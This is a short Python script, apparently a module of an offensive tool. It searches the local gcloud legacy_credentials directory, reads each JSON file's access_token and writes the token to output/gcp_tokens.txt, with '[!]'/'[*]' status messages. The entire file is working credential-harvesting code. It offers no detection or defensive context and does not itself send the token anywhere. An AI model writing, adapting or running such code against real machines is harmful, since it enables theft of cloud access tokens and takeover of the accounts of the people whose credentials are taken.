import os
import json

def extract_gcp_tokens(verbose=False):
    token_path = os.path.expanduser("~/.config/gcloud/legacy_credentials")
    if not os.path.exists(token_path):
        print("[!] GCP token directory not found.")
        return

    found = False
    for root, dirs, files in os.walk(token_path):
        for file in files:
            if "adc" in file or file.endswith(".json"):
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, "r") as f:
                        data = json.load(f)
                    if "access_token" in data:
                        os.makedirs("output", exist_ok=True)
                        with open("output/gcp_tokens.txt", "w") as out:
                            out.write(f"AccessToken: {data['access_token']}\n")
                        if verbose:
                            print(f"[*] GCP token extracted from: {full_path}")
                        found = True
                        break
                except Exception:
                    continue

    if not found:
        print("[!] No valid GCP token found.")
